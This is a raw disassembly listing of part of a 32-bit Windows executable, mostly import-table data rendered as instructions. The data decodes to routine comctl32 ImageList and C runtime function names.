  427d2f:	add    BYTE PTR [eax],al
  427d31:	add    BYTE PTR [eax],al
  427d33:	pop    ecx
  427d34:	jge    0x427d38
  427d36:	add    BYTE PTR [ecx],al
  427d38:	add    BYTE PTR [eax],al
  427d3a:	add    BYTE PTR [ecx],al
  427d3c:	add    BYTE PTR [eax],al
  427d3e:	add    BYTE PTR [ecx],al
  427d40:	add    BYTE PTR [eax],al
  427d42:	add    BYTE PTR [edi+0x7d],cl
  427d45:	add    al,BYTE PTR [eax]
  427d47:	push   ebx
  427d48:	jge    0x427d4c
  427d4a:	add    BYTE PTR [edi+0x7d],dl
  427d4d:	add    al,BYTE PTR [eax]
  427d4f:	in     eax,dx
  427d50:	arpl   WORD PTR [eax],ax
  427d52:	add    BYTE PTR [edx+0x7d],ch
  427d55:	add    al,BYTE PTR [eax]
  427d57:	add    BYTE PTR [eax],al
  427d59:	dec    bp
  427d5b:	jno    0x427db2
  427d5d:	outs   dx,DWORD PTR ds:[esi]
  427d5e:	pop    ecx
  427d5f:	xor    al,0x55
  427d61:	jbe    0x427dd1
  427d63:	dec    eax
  427d64:	cs data16 ins BYTE PTR es:[di],dx
  427d68:	jo     0x427d6a
  427d6a:	aas    
  427d6b:	inc    edi
  427d6c:	outs   dx,BYTE PTR gs:[esi]
  427d6e:	gs jb  0x427dd2
  427d71:	je     0x427dd8
  427d73:	push   eax
  427d74:	outs   dx,DWORD PTR ds:[esi]
  427d75:	imul   ebp,DWORD PTR [esi+0x74],0x4077654e
  427d7c:	inc    eax
  427d7d:	pop    ecx
  427d7e:	inc    edi
  427d7f:	inc    esi
  427d80:	push   eax
  427d81:	inc    ecx
  427d82:	pop    edi
  427d83:	dec    esi
  427d84:	inc    esp
  427d85:	cmp    al,0x56
  427d87:	add    bh,dh
  427d89:	jl     0x427dcd
  427d8b:	add    bl,bh
  427d8d:	jl     0x427dd1
  427d8f:	add    bh,bh
  427d91:	jl     0x427dd5
  427d93:	add    BYTE PTR [ebx],al
  427d95:	jge    0x427dd9
  427d97:	add    BYTE PTR [edi],al
  427d99:	jge    0x427ddd
  427d9b:	add    BYTE PTR [ebx],cl
  427d9d:	jge    0x427de1
  427d9f:	add    BYTE PTR [edi],cl
  427da1:	jge    0x427de5
  427da3:	add    BYTE PTR [ebx],dl
  427da5:	jge    0x427de9
  427da7:	add    BYTE PTR [edi],dl
  427da9:	jge    0x427ded
  427dab:	add    BYTE PTR [ebx],bl
  427dad:	jge    0x427df1
  427daf:	add    BYTE PTR [edi],bl
  427db1:	jge    0x427df5
  427db3:	add    BYTE PTR [eax],al
  427db5:	add    BYTE PTR [eax],al
  427db7:	das    
  427db8:	jle    0x427dbc
	...
  427dc2:	add    bl,al
  427dc4:	add    BYTE PTR [edx],0x0
  427dc7:	out    0x78,eax
  427dc9:	add    al,BYTE PTR [eax]
  427dcb:	dec    ebx
  427dcc:	jle    0x427dd0
	...
  427dd6:	add    BYTE PTR [ebp+0x3000284],dh
  427ddc:	jns    0x427de0
  427dde:	add    bh,bh
  427de0:	jle    0x427de4
	...
  427dea:	add    BYTE PTR [edi-0x78],dl
  427ded:	add    al,BYTE PTR [eax]
  427def:	mov    bh,0x79
  427df1:	add    al,BYTE PTR [eax]
  427df3:	sar    DWORD PTR [edi+0x2],cl
	...
  427dfe:	add    BYTE PTR [edi-0x74fffd71],ah
  427e04:	jp     0x427e08
  427e06:	add    BYTE PTR [edi+0x281],al
  427e0c:	add    BYTE PTR [eax],al
  427e0e:	add    BYTE PTR [eax],al
  427e10:	add    BYTE PTR [eax],al
  427e12:	add    BYTE PTR [edi+0x3f000292],dl
  427e18:	jl     0x427e1c
	...
  427e2e:	add    BYTE PTR [edi],bh
  427e30:	add    BYTE PTR [edx],0x0
  427e33:	push   ecx
  427e34:	add    BYTE PTR [edx],0x0
  427e37:	imul   eax,DWORD PTR [edx-0x7d7efffe],0x82970002
  427e41:	add    al,BYTE PTR [eax]
  427e43:	stos   DWORD PTR es:[edi],eax
  427e44:	add    BYTE PTR [edx],0x0
  427e47:	add    BYTE PTR [eax],al
  427e49:	add    BYTE PTR [eax],al
  427e4b:	rol    DWORD PTR [edx-0x7d20fffe],1
  427e51:	add    al,BYTE PTR [eax]
  427e53:	jmp    0xf34280da
  427e58:	add    BYTE PTR [edx],0x0
  427e5b:	std    
  427e5c:	add    BYTE PTR [edx],0x0
  427e5f:	jae    0x835f7e67
  427e65:	add    al,BYTE PTR [eax]
  427e67:	and    eax,0x35000283
  427e6c:	add    DWORD PTR [edx],0x0
  427e6f:	aas    
  427e70:	add    DWORD PTR [edx],0x0
  427e73:	dec    ecx
  427e74:	add    DWORD PTR [edx],0x0
  427e77:	push   ebx
  427e78:	add    DWORD PTR [edx],0x0
  427e7b:	pop    ebp
  427e7c:	add    DWORD PTR [edx],0x0
  427e7f:	add    DWORD PTR [bp+si],0x0
  427e83:	jno    0x427e08
  427e85:	add    al,BYTE PTR [eax]
  427e87:	jns    0x427e0c
  427e89:	add    al,BYTE PTR [eax]
  427e8b:	add    DWORD PTR [ebx-0x7c74fffe],0x83950002
  427e95:	add    al,BYTE PTR [eax]
  427e97:	lahf   
  427e98:	add    DWORD PTR [edx],0x0
  427e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e9c:	add    DWORD PTR [edx],0x0
  427e9f:	mov    ch,0x83
  427ea1:	add    al,BYTE PTR [eax]
  427ea3:	rol    DWORD PTR [ebx-0x7c32fffe],0x2
  427eaa:	add    cl,bl
  427eac:	add    DWORD PTR [edx],0x0
  427eaf:	jecxz  0x427e34
  427eb1:	add    al,BYTE PTR [eax]
  427eb3:	out    dx,eax
  427eb4:	add    DWORD PTR [edx],0x0
  427eb7:	std    
  427eb8:	add    DWORD PTR [edx],0x0
  427ebb:	pop    es
  427ebc:	test   BYTE PTR [edx],al
  427ebe:	add    BYTE PTR [ecx],dl
  427ec0:	test   BYTE PTR [edx],al
  427ec2:	add    BYTE PTR [edi],bl
  427ec4:	test   BYTE PTR [edx],al
  427ec6:	add    BYTE PTR [edi],ah
  427ec8:	test   BYTE PTR [edx],al
  427eca:	add    BYTE PTR [ecx],dh
  427ecc:	test   BYTE PTR [edx],al
  427ece:	add    BYTE PTR [ebx],bh
  427ed0:	test   BYTE PTR [edx],al
  427ed2:	add    BYTE PTR [ebp-0x7c],al
  427ed5:	add    al,BYTE PTR [eax]
  427ed7:	dec    ebp
  427ed8:	test   BYTE PTR [edx],al
  427eda:	add    BYTE PTR [edi-0x7c],dl
  427edd:	add    al,BYTE PTR [eax]
  427edf:	popa   
  427ee0:	test   BYTE PTR [edx],al
  427ee2:	add    BYTE PTR [ebx-0x7c],ch
  427ee5:	add    al,BYTE PTR [eax]
  427ee7:	jg     0x427e6d
  427ee9:	add    al,BYTE PTR [eax]
  427eeb:	mov    DWORD PTR [edx+eax*1+0x2849300],eax
  427ef2:	add    BYTE PTR [ebx-0x54fffd7c],bl
  427ef8:	test   BYTE PTR [edx],al
  427efa:	add    BYTE PTR [eax],al
  427efc:	add    BYTE PTR [eax],al
  427efe:	add    cl,al
  427f00:	test   BYTE PTR [edx],al
  427f02:	add    cl,bl
  427f04:	test   BYTE PTR [edx],al
  427f06:	add    bh,ah
  427f08:	test   BYTE PTR [edx],al
  427f0a:	add    bl,bh
  427f0c:	test   BYTE PTR [edx],al
  427f0e:	add    BYTE PTR ds:0x1d000285,cl
  427f14:	test   DWORD PTR [edx],eax
  427f16:	add    BYTE PTR [edi],ch
  427f18:	test   DWORD PTR [edx],eax
  427f1a:	add    BYTE PTR ds:0x51000285,bh
  427f20:	test   DWORD PTR [edx],eax
  427f22:	add    BYTE PTR [ecx-0x7b],ah
  427f25:	add    al,BYTE PTR [eax]
  427f27:	ja     0x427eae
  427f29:	add    al,BYTE PTR [eax]
  427f2b:	mov    eax,DWORD PTR [ebp-0x7a64fffe]
  427f31:	add    al,BYTE PTR [eax]
  427f33:	mov    ds:0xb9000285,eax
  427f38:	test   DWORD PTR [edx],eax
  427f3a:	add    cl,cl
  427f3c:	test   DWORD PTR [edx],eax
  427f3e:	add    ch,dl
  427f40:	test   DWORD PTR [edx],eax
  427f42:	add    bh,ah
  427f44:	test   DWORD PTR [edx],eax
  427f46:	add    cl,dh
  427f48:	test   DWORD PTR [edx],eax
  427f4a:	add    BYTE PTR [ebx],cl
  427f4c:	xchg   BYTE PTR [edx],al
  427f4e:	add    BYTE PTR [ecx],ah
  427f50:	xchg   BYTE PTR [edx],al
  427f52:	add    BYTE PTR ds:0x45000286,dh
  427f58:	xchg   BYTE PTR [edx],al
  427f5a:	add    BYTE PTR [ecx-0x7a],dl
  427f5d:	add    al,BYTE PTR [eax]
  427f5f:	popa   
  427f60:	xchg   BYTE PTR [edx],al
  427f62:	add    BYTE PTR [ebp-0x7a],ch
  427f65:	add    al,BYTE PTR [eax]
  427f67:	jg     0x427eef
  427f69:	add    al,BYTE PTR [eax]
  427f6b:	lea    eax,[esi-0x7964fffe]
  427f71:	add    al,BYTE PTR [eax]
  427f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f74:	xchg   BYTE PTR [edx],al
  427f76:	add    BYTE PTR [ecx-0x32fffd7a],bh
  427f7c:	xchg   BYTE PTR [edx],al
  427f7e:	add    cl,bl
  427f80:	xchg   BYTE PTR [edx],al
  427f82:	add    ch,ch
  427f84:	xchg   BYTE PTR [edx],al
  427f86:	add    bl,bh
  427f88:	xchg   BYTE PTR [edx],al
  427f8a:	add    BYTE PTR ds:0x1d000287,cl
  427f90:	xchg   DWORD PTR [edx],eax
  427f92:	add    BYTE PTR [ebx],ch
  427f94:	xchg   DWORD PTR [edx],eax
  427f96:	add    BYTE PTR [ecx-0x79],al
  427f99:	add    al,BYTE PTR [eax]
  427f9b:	dec    ebp
  427f9c:	xchg   DWORD PTR [edx],eax
  427f9e:	add    BYTE PTR [ebx-0x79],ah
  427fa1:	add    al,BYTE PTR [eax]
  427fa3:	jg     0x427f2c
  427fa5:	add    al,BYTE PTR [eax]
  427fa7:	xchg   ebx,eax
  427fa8:	xchg   DWORD PTR [edx],eax
  427faa:	add    BYTE PTR [edi-0x44fffd79],ah
  427fb0:	xchg   DWORD PTR [edx],eax
  427fb2:	add    cl,dl
  427fb4:	xchg   DWORD PTR [edx],eax
  427fb6:	add    cl,ch
  427fb8:	xchg   DWORD PTR [edx],eax
  427fba:	add    bh,dh
  427fbc:	xchg   DWORD PTR [edx],eax
  427fbe:	add    BYTE PTR [ecx],cl
  427fc0:	mov    BYTE PTR [edx],al
  427fc2:	add    BYTE PTR [edi],bl
  427fc4:	mov    BYTE PTR [edx],al
  427fc6:	add    BYTE PTR [ecx],dh
  427fc8:	mov    BYTE PTR [edx],al
  427fca:	add    BYTE PTR [ebp-0x78],al
  427fcd:	add    al,BYTE PTR [eax]
  427fcf:	add    BYTE PTR [eax],al
  427fd1:	add    BYTE PTR [eax],al
  427fd3:	mov    BYTE PTR gs:[edx],al
  427fd6:	add    BYTE PTR [ebx-0x78],dh
  427fd9:	add    al,BYTE PTR [eax]
  427fdb:	test   DWORD PTR [eax-0x7768fffe],ecx
  427fe1:	add    al,BYTE PTR [eax]
  427fe3:	mov    ds:0xb5000288,eax
  427fe8:	mov    BYTE PTR [edx],al
  427fea:	add    bh,al
  427fec:	mov    BYTE PTR [edx],al
  427fee:	add    bl,bl
  427ff0:	mov    BYTE PTR [edx],al
  427ff2:	add    bh,ah
  427ff4:	mov    BYTE PTR [edx],al
  427ff6:	add    ch,dh
  427ff8:	mov    BYTE PTR [edx],al
  427ffa:	add    BYTE PTR [ecx],al
  427ffc:	mov    DWORD PTR [edx],eax
  427ffe:	add    BYTE PTR [ebx],dl
  428000:	mov    DWORD PTR [edx],eax
  428002:	add    BYTE PTR [ecx],ah
  428004:	mov    DWORD PTR [edx],eax
  428006:	add    BYTE PTR [edi],ch
  428008:	mov    DWORD PTR [edx],eax
  42800a:	add    BYTE PTR [ebx-0x77],cl
  42800d:	add    al,BYTE PTR [eax]
  42800f:	pop    ebx
  428010:	mov    DWORD PTR [edx],eax
  428012:	add    BYTE PTR [ebp-0x77],dh
  428015:	add    al,BYTE PTR [eax]
  428017:	test   DWORD PTR [ecx-0x7664fffe],ecx
  42801d:	add    al,BYTE PTR [eax]
  42801f:	stos   DWORD PTR es:[edi],eax
  428020:	mov    DWORD PTR [edx],eax
  428022:	add    BYTE PTR [edi-0x34fffd77],dh
  428028:	mov    DWORD PTR [edx],eax
  42802a:	add    bl,ah
  42802c:	mov    DWORD PTR [edx],eax
  42802e:	add    bh,ch
  428030:	mov    DWORD PTR [edx],eax
  428032:	add    bh,bh
  428034:	mov    DWORD PTR [edx],eax
  428036:	add    BYTE PTR [ebx],cl
  428038:	mov    al,BYTE PTR [edx]
  42803a:	add    BYTE PTR [edi],dl
  42803c:	mov    al,BYTE PTR [edx]
  42803e:	add    BYTE PTR ds:0x2f00028a,ah
  428044:	mov    al,BYTE PTR [edx]
  428046:	add    BYTE PTR [edi],bh
  428048:	mov    al,BYTE PTR [edx]
  42804a:	add    BYTE PTR [ecx-0x76],dl
  42804d:	add    al,BYTE PTR [eax]
  42804f:	pop    ebp
  428050:	mov    al,BYTE PTR [edx]
  428052:	add    BYTE PTR [edi-0x76],ch
  428055:	add    al,BYTE PTR [eax]
  428057:	jnp    0x427fe3
  428059:	add    al,BYTE PTR [eax]
  42805b:	xchg   DWORD PTR [edx-0x7568fffe],ecx
  428061:	add    al,BYTE PTR [eax]
  428063:	lods   eax,DWORD PTR ds:[esi]
  428064:	mov    al,BYTE PTR [edx]
  428066:	add    BYTE PTR [ebx-0x32fffd76],bh
  42806c:	mov    al,BYTE PTR [edx]
  42806e:	add    ch,bl
  428070:	mov    al,BYTE PTR [edx]
  428072:	add    ch,ch
  428074:	mov    al,BYTE PTR [edx]
  428076:	add    BYTE PTR [ecx],cl
  428078:	mov    eax,DWORD PTR [edx]
  42807a:	add    BYTE PTR [ecx],bl
  42807c:	mov    eax,DWORD PTR [edx]
  42807e:	add    BYTE PTR [ecx],ch
  428080:	mov    eax,DWORD PTR [edx]
  428082:	add    BYTE PTR [edi],dh
  428084:	mov    eax,DWORD PTR [edx]
  428086:	add    BYTE PTR [ebp-0x75],cl
  428089:	add    al,BYTE PTR [eax]
  42808b:	pop    ebx
  42808c:	mov    eax,DWORD PTR [edx]
  42808e:	add    BYTE PTR [ebp-0x75],ah
  428091:	add    al,BYTE PTR [eax]
  428093:	jno    0x428020
  428095:	add    al,BYTE PTR [eax]
  428097:	or     DWORD PTR [ebx-0x7464fffe],0x2
  42809e:	add    BYTE PTR [ebp-0x42fffd75],ch
  4280a4:	mov    eax,DWORD PTR [edx]
  4280a6:	add    cl,dl
  4280a8:	mov    eax,DWORD PTR [edx]
  4280aa:	add    cl,ah
  4280ac:	mov    eax,DWORD PTR [edx]
  4280ae:	add    bh,dh
  4280b0:	mov    eax,DWORD PTR [edx]
  4280b2:	add    BYTE PTR ds:0x1900028c,al
  4280b8:	mov    WORD PTR [edx],es
  4280ba:	add    BYTE PTR [edi],ah
  4280bc:	mov    WORD PTR [edx],es
  4280be:	add    BYTE PTR [ecx],bh
  4280c0:	mov    WORD PTR [edx],es
  4280c2:	add    BYTE PTR [ebx-0x74],cl
  4280c5:	add    al,BYTE PTR [eax]
  4280c7:	pop    ebp
  4280c8:	mov    WORD PTR [edx],es
  4280ca:	add    BYTE PTR [ecx-0x74],ch
  4280cd:	add    al,BYTE PTR [eax]
  4280cf:	ja     0x42805d
  4280d1:	add    al,BYTE PTR [eax]
  4280d3:	lea    ecx,[edx+eax*1+0x28ca100]
  4280da:	add    BYTE PTR [ebp-0x38fffd74],dh
  4280e0:	mov    WORD PTR [edx],es
  4280e2:	add    cl,dl
  4280e4:	mov    WORD PTR [edx],es
  4280e6:	add    bl,ah
  4280e8:	mov    WORD PTR [edx],es
  4280ea:	add    bh,dh
  4280ec:	mov    WORD PTR [edx],es
  4280ee:	add    BYTE PTR [ebx],cl
  4280f0:	lea    eax,[edx]
  4280f2:	add    BYTE PTR [ebx],bl
  4280f4:	lea    eax,[edx]
  4280f6:	add    BYTE PTR [ecx],ch
  4280f8:	lea    eax,[edx]
  4280fa:	add    BYTE PTR [ebx-0x73],al
  4280fd:	add    al,BYTE PTR [eax]
  4280ff:	pop    ebx
  428100:	lea    eax,[edx]
  428102:	add    BYTE PTR [ecx-0x73],ch
  428105:	add    al,BYTE PTR [eax]
  428107:	jnp    0x428096
  428109:	add    al,BYTE PTR [eax]
  42810b:	mov    DWORD PTR [ebp-0x726afffe],ecx
  428111:	add    al,BYTE PTR [eax]
  428113:	scas   eax,DWORD PTR es:[edi]
  428114:	lea    eax,[edx]
  428116:	add    cl,al
  428118:	lea    eax,[edx]
  42811a:	add    bl,dl
  42811c:	lea    eax,[edx]
  42811e:	add    bl,ah
  428120:	lea    eax,[edx]
  428122:	add    bl,dh
  428124:	lea    eax,[edx]
  428126:	add    ch,bh
  428128:	lea    eax,[edx]
  42812a:	add    BYTE PTR ds:0x1f00028e,cl
  428130:	mov    es,WORD PTR [edx]
  428132:	add    BYTE PTR [edi],ch
  428134:	mov    es,WORD PTR [edx]
  428136:	add    BYTE PTR [ebp-0x72],al
  428139:	add    al,BYTE PTR [eax]
  42813b:	pop    ebp
  42813c:	mov    es,WORD PTR [edx]
  42813e:	add    BYTE PTR [edi-0x72],ch
  428141:	add    al,BYTE PTR [eax]
  428143:	jg     0x4280d3
  428145:	add    al,BYTE PTR [eax]
  428147:	xchg   ecx,eax
  428148:	mov    es,WORD PTR [edx]
  42814a:	add    BYTE PTR [edi-0x4efffd72],bl
  428150:	mov    es,WORD PTR [edx]
  428152:	add    BYTE PTR [edi-0x2efffd72],bh
  428158:	mov    es,WORD PTR [edx]
  42815a:	add    bl,ah
  42815c:	mov    es,WORD PTR [edx]
  42815e:	add    bh,dh
  428160:	mov    es,WORD PTR [edx]
  428162:	add    BYTE PTR [ebx],cl
  428164:	pop    DWORD PTR [edx]
  428166:	add    BYTE PTR ds:0x3300028f,bl
  42816c:	pop    DWORD PTR [edx]
  42816e:	add    BYTE PTR [ebp-0x71],al
  428171:	add    al,BYTE PTR [eax]
  428173:	popa   
  428174:	pop    DWORD PTR [edx]
  428176:	add    BYTE PTR [edi-0x71],dh
  428179:	add    al,BYTE PTR [eax]
  42817b:	test   DWORD PTR [edi-0x7066fffe],ecx
  428181:	add    al,BYTE PTR [eax]
  428183:	add    BYTE PTR [eax],al
  428185:	add    BYTE PTR [eax],al
  428187:	mov    bl,0x8f
  428189:	add    al,BYTE PTR [eax]
  42818b:	ret    
  42818c:	pop    DWORD PTR [edx]
  42818e:	add    bl,bl
  428190:	pop    DWORD PTR [edx]
  428192:	add    ch,ah
  428194:	pop    DWORD PTR [edx]
  428196:	add    ch,dh
  428198:	pop    DWORD PTR [edx]
  42819a:	add    BYTE PTR [ecx],cl
  42819c:	nop
  42819d:	add    al,BYTE PTR [eax]
  42819f:	pop    ss
  4281a0:	nop
  4281a1:	add    al,BYTE PTR [eax]
  4281a3:	sub    edx,DWORD PTR [eax-0x6fc0fffe]
  4281a9:	add    al,BYTE PTR [eax]
  4281ab:	dec    edi
  4281ac:	nop
  4281ad:	add    al,BYTE PTR [eax]
  4281af:	pop    ebp
  4281b0:	nop
  4281b1:	add    al,BYTE PTR [eax]
  4281b3:	addr16 nop
  4281b5:	add    al,BYTE PTR [eax]
  4281b7:	jns    0x428149
  4281b9:	add    al,BYTE PTR [eax]
  4281bb:	lea    edx,[eax-0x6f66fffe]
  4281c1:	add    al,BYTE PTR [eax]
  4281c3:	scas   eax,DWORD PTR es:[edi]
  4281c4:	nop
  4281c5:	add    al,BYTE PTR [eax]
  4281c7:	ret    
  4281c8:	nop
  4281c9:	add    al,BYTE PTR [eax]
  4281cb:	rcl    DWORD PTR [eax-0x6f1afffe],1
  4281d1:	add    al,BYTE PTR [eax]
  4281d3:	stc    
  4281d4:	nop
  4281d5:	add    al,BYTE PTR [eax]
  4281d7:	add    eax,0x11000291
  4281dc:	xchg   ecx,eax
  4281dd:	add    al,BYTE PTR [eax]
  4281df:	daa    
  4281e0:	xchg   ecx,eax
  4281e1:	add    al,BYTE PTR [eax]
  4281e3:	xor    eax,0x41000291
  4281e8:	xchg   ecx,eax
  4281e9:	add    al,BYTE PTR [eax]
  4281eb:	push   ebx
  4281ec:	xchg   ecx,eax
  4281ed:	add    al,BYTE PTR [eax]
  4281ef:	imul   edx,DWORD PTR [ecx-0x6e88fffe],0x918b0002
  4281f9:	add    al,BYTE PTR [eax]
  4281fb:	fwait
  4281fc:	xchg   ecx,eax
  4281fd:	add    al,BYTE PTR [eax]
  4281ff:	stos   DWORD PTR es:[edi],eax
  428200:	xchg   ecx,eax
  428201:	add    al,BYTE PTR [eax]
  428203:	mov    ecx,0xc3000291
  428208:	xchg   ecx,eax
  428209:	add    al,BYTE PTR [eax]
  42820b:	int    0x91
  42820d:	add    al,BYTE PTR [eax]
  42820f:	fst    DWORD PTR [ecx-0x6e1afffe]
  428215:	add    al,BYTE PTR [eax]
  428217:	not    DWORD PTR [ecx-0x6df2fffe]
  42821d:	add    al,BYTE PTR [eax]
  42821f:	daa    
  428220:	xchg   edx,eax
  428221:	add    al,BYTE PTR [eax]
  428223:	aaa    
  428224:	xchg   edx,eax
  428225:	add    al,BYTE PTR [eax]
  428227:	inc    ecx
  428228:	xchg   edx,eax
  428229:	add    al,BYTE PTR [eax]
  42822b:	push   ecx
  42822c:	xchg   edx,eax
  42822d:	add    al,BYTE PTR [eax]
  42822f:	arpl   WORD PTR [edx-0x6d8efffe],dx
  428235:	add    al,BYTE PTR [eax]
  428237:	mov    edx,DWORD PTR [edx+0x2]
  42823d:	add    BYTE PTR [eax],al
  42823f:	pop    esp
  428240:	add    BYTE PTR [eax+0x72],dl
  428243:	outs   dx,DWORD PTR ds:[esi]
  428244:	jo     0x4282ab
  428246:	jb     0x4282bc
  428248:	jns    0x42829d
  42824a:	push   0x57746565
  42824f:	add    BYTE PTR [eax],al
  428251:	push   ebx
  428252:	add    BYTE PTR [ecx+0x6d],cl
  428255:	popa   
  428256:	addr16 gs dec esp
  428259:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  428260:	dec    ecx
  428261:	arpl   WORD PTR [edi+0x6e],bp
  428264:	push   ebx
  428265:	imul   edi,DWORD PTR [edx+0x65],0x49004e00
  42826c:	ins    DWORD PTR es:[edi],dx
  42826d:	popa   
  42826e:	addr16 gs dec esp
  428271:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428278:	ins    BYTE PTR es:[edi],dx
  428279:	popa   
  42827a:	arpl   WORD PTR [ebp+0x49],sp
  42827d:	arpl   WORD PTR [edi+0x6e],bp
  428280:	add    BYTE PTR [eax+eax*1],ch
  428283:	dec    ecx
  428284:	ins    DWORD PTR es:[edi],dx
  428285:	popa   
  428286:	addr16 gs dec esp
  428289:	imul   esi,DWORD PTR [ebx+0x74],0x6464415f
  428290:	dec    ebp
  428291:	popa   
  428292:	jae    0x4282ff
  428294:	gs add BYTE PTR fs:[eax],dh
  428298:	add    BYTE PTR [ecx+0x6d],cl
  42829b:	popa   
  42829c:	addr16 gs dec esp
  42829f:	imul   esi,DWORD PTR [ebx+0x74],0x6572435f
  4282a6:	popa   
  4282a7:	je     0x42830e
  4282a9:	add    BYTE PTR [eax],al
  4282ab:	inc    ebp
  4282ac:	add    BYTE PTR [ecx+0x6d],cl
  4282af:	popa   
  4282b0:	addr16 gs dec esp
  4282b3:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4282ba:	fs dec ecx
  4282bc:	ins    DWORD PTR es:[edi],dx
  4282bd:	popa   
  4282be:	addr16 gs push edi
  4282c1:	add    BYTE PTR [eax],al
  4282c3:	inc    ebx
  4282c4:	dec    edi
  4282c5:	dec    ebp
  4282c6:	inc    ebx
  4282c7:	push   esp
  4282c8:	dec    esp
  4282c9:	xor    esi,DWORD PTR [edx]
  4282cb:	cs fs ins BYTE PTR es:[edi],dx
  4282ce:	ins    BYTE PTR es:[edi],dx
  4282cf:	add    BYTE PTR [eax],al
  4282d1:	cmc    
  4282d2:	add    BYTE PTR [edi+0x63],bl
  4282d5:	outs   dx,DWORD PTR ds:[esi]
  4282d6:	outs   dx,BYTE PTR ds:[esi]
  4282d7:	je     0x42834b
  4282d9:	outs   dx,DWORD PTR ds:[esi]
  4282da:	ins    BYTE PTR es:[edi],dx
  4282db:	data16 jo 0x4282de
  4282de:	add    BYTE PTR [ebx+0x3],bl
  4282e1:	bound  esi,QWORD PTR [ebx+0x65]
  4282e4:	popa   
  4282e5:	jb     0x42834a
  4282e7:	push   0x69039b00
  4282ec:	jae    0x42835e
  4282ee:	jb     0x428359
  4282f0:	outs   dx,BYTE PTR ds:[esi]
  4282f1:	je     0x4282f3
  4282f3:	test   BYTE PTR [ebx],0x73
  4282f6:	je     0x42836a
  4282f8:	jb     0x42835d
  4282fa:	push   0xb30072
  4282ff:	pop    edi
  428300:	pop    edi
  428301:	jae    0x428368
  428303:	je     0x428364
  428305:	popa   
  428306:	jo     0x428378
  428308:	pop    edi
  428309:	je     0x428384
  42830b:	jo     0x428372
  42830d:	add    BYTE PTR [eax],al
  42830f:	mov    al,ds:0x705f5f00
  428314:	pop    edi
  428315:	pop    edi
  428316:	ins    WORD PTR es:[edi],dx
  428318:	outs   dx,DWORD PTR ds:[esi]
  428319:	fs add BYTE PTR gs:[eax],al
  42831d:	jge    0x428322
  42831f:	data16 jb 0x428387
  428322:	add    BYTE PTR gs:[eax],al
  428325:	fwait
  428326:	add    BYTE PTR [edi+0x5f],bl
  428329:	jo     0x42838a
  42832b:	pop    edi
  42832c:	arpl   WORD PTR [edi+0x6d],bp
  42832f:	ins    DWORD PTR es:[edi],dx
  428330:	outs   dx,DWORD PTR ds:[esi]
  428331:	fs add BYTE PTR gs:[eax],al
  428335:	and    eax,0x73637704
  42833a:	ins    BYTE PTR es:[edi],dx
  42833b:	outs   dx,BYTE PTR gs:[esi]
  42833d:	add    BYTE PTR [eax],al
  42833f:	and    DWORD PTR [edi+esi*2],eax
  428342:	arpl   WORD PTR [ebx+0x63],si
  428345:	jo     0x4283c0
  428347:	add    BYTE PTR [eax],al
  428349:	or     al,BYTE PTR [esp+esi*2]
  42834c:	outs   dx,DWORD PTR ds:[esi]
  42834d:	jne    0x4283bf
  42834f:	jo     0x4283b6
  428351:	jb     0x428353
  428353:	rol    BYTE PTR [ebx],cl
  428355:	jb     0x4283bc
  428357:	ins    DWORD PTR es:[edi],dx
  428358:	outs   dx,DWORD PTR ds:[esi]
  428359:	jbe    0x4283c0
  42835b:	add    BYTE PTR [eax],al
  42835d:	xchg   edi,eax
  42835e:	add    ebp,DWORD PTR [ecx+0x73]
  428361:	imul   esp,DWORD PTR fs:[edi+0x69],0x3ea0074
  428369:	jae    0x4283df
  42836b:	jb     0x4283d0
  42836d:	jae    0x4283df
  42836f:	outs   dx,BYTE PTR ds:[esi]
  428370:	add    BYTE PTR [edi+0x74656703],cl
  428376:	jae    0x428378
  428378:	add    bh,cl
  42837a:	add    esi,DWORD PTR [edx+0x61]
  42837d:	outs   dx,BYTE PTR ds:[esi]
  42837e:	add    BYTE PTR fs:[eax],al
  428381:	mov    ch,0x3
  428383:	ins    DWORD PTR es:[edi],dx
  428384:	popa   
  428385:	ins    BYTE PTR es:[edi],dx
  428386:	ins    BYTE PTR es:[edi],dx
  428387:	outs   dx,DWORD PTR ds:[esi]
  428388:	arpl   WORD PTR [eax],ax
  42838a:	add    al,cl
  42838c:	add    esi,DWORD PTR [eax+0x75]
  42838f:	je     0x4283f4
  428391:	push   0x1c007261
  428396:	add    al,0x77
  428398:	arpl   WORD PTR [ebx+0x63],si
  42839b:	popa   
  42839c:	je     0x42839e
  42839e:	add    BYTE PTR [eax+0x3],ah
  4283a1:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4283a5:	imul   eax,DWORD PTR [eax],0xffffffdb
  4283a8:	add    BYTE PTR [edi+0x61],bl
  4283ab:	ins    DWORD PTR es:[edi],dx
  4283ac:	jae    0x428415
  4283ae:	pop    edi
  4283af:	gs js  0x42841b
  4283b2:	je     0x4283b4
  4283b4:	add    BYTE PTR [edi+0x77736903],ah
  4283ba:	jo     0x42842e
  4283bc:	imul   ebp,DWORD PTR [esi+0x74],0x1860000
  4283c3:	pop    edi
  4283c4:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  4283cb:	ins    DWORD PTR es:[edi],dx
  4283cc:	add    bl,ch
  4283ce:	add    esi,DWORD PTR [ebx+0x74]
  4283d1:	jb     0x428438
  4283d3:	jb     0x428447
  4283d5:	outs   dx,DWORD PTR ds:[esi]
  4283d6:	jb     0x4283d8
  4283d8:	add    ch,bh
  4283da:	add    esi,DWORD PTR [ebx+0x74]
  4283dd:	jb     0x428453
  4283df:	outs   dx,DWORD PTR ds:[esi]
  4283e0:	jne    0x42844e
  4283e2:	add    bh,bh
  4283e4:	add    esi,DWORD PTR [ebx+0x77]
  4283e7:	jo     0x42845b
  4283e9:	imul   ebp,DWORD PTR [esi+0x74],0x9e000066
  4283f0:	add    DWORD PTR [edi+0x69],ebx
  4283f3:	jae    0x428462
  4283f5:	bound  esp,QWORD PTR [edx+0x6c]
  4283f8:	gs popa 
  4283fa:	add    BYTE PTR fs:[eax],al
  4283fd:	fld    DWORD PTR [ebx]
  4283ff:	jae    0x428466
  428401:	je     0x428479
  428403:	bound  esi,QWORD PTR [ebp+0x66]
  428406:	add    BYTE PTR ds:0x676e7504,cl
  42840c:	gs je  0x428472
  42840f:	add    BYTE PTR [eax],al
  428411:	push   edx
  428412:	add    BYTE PTR [edi+0x58],bl
